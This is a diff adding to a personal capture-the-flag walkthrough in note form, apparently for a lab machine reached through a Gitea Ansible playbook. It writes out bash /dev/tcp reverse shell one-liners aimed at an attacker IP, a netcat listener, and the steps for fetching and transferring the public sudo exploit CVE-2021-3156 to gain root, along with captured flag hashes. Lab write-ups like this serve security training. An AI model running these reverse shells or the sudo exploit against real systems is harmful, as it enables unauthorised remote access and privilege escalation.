@@ -76,3 +76,99 @@ http://10.10.113.42:1337/
 
 ![[Pasted image 20230703212746.png]]
 
+http://10.10.113.42:3000/samarium/ansible
+
+![[Pasted image 20230703213507.png]]
+
+http://10.10.113.42:3000/samarium/ansible/raw/branch/main/playbook.yaml
+
+```
+---
+- name: Test 
+  hosts: all                                  # Define all the hosts
+  remote_user: bismuth                                  
+  # Defining the Ansible task
+  tasks:             
+    - name: get the username running the deploy
+      become: false
+      command: whoami
+      register: username_on_the_host
+      changed_when: false
+
+    - debug: var=username_on_the_host
+
+    - name: Test
+      shell: echo hi
+```
+
+```
+bash -i >& /dev/tcp/<#ATTACKERIP>/<#ATTACKERPORT> 0>&1
+```
+
+```
+bash -c "bash -i >& /dev/tcp/10.17.44.152/4444 0>&1"
+```
+
+```
+nc -lnvp 4444
+```
+
+![[Pasted image 20230703215406.png]]
+
+![[Pasted image 20230703215437.png]]
+
+![[Pasted image 20230703215509.png]]
+
+```
+5e2cafbbf180351702651c09cd797920
+```
+
+https://github.com/blasty/CVE-2021-3156/blob/main/hax.c
+
+![[Pasted image 20230703220553.png]]
+
+```
+searchsploit -m 49522
+```
+
+![[Pasted image 20230703220703.png]]
+
+```
+git clone https://github.com/blasty/CVE-2021-3156
+```
+
+```
+tar -cvf exploit.tar CVE-2021-3156
+```
+
+```
+python3 -m http.server
+```
+
+![[Pasted image 20230703222439.png]]
+
+![[Pasted image 20230703222459.png]]
+
+![[Pasted image 20230703222534.png]]
+
+```
+tar xopf exploit.tar
+```
+
+![[Pasted image 20230703222823.png]]
+
+![[Pasted image 20230703223211.png]]
+
+![[Pasted image 20230703223842.png]]
+
+```
+6d2a9f8f8174e86e27d565087a28a971
+```
+
+![[Pasted image 20230703223955.png]]
+
+![[Pasted image 20230703224049.png]]
+
+
+
+
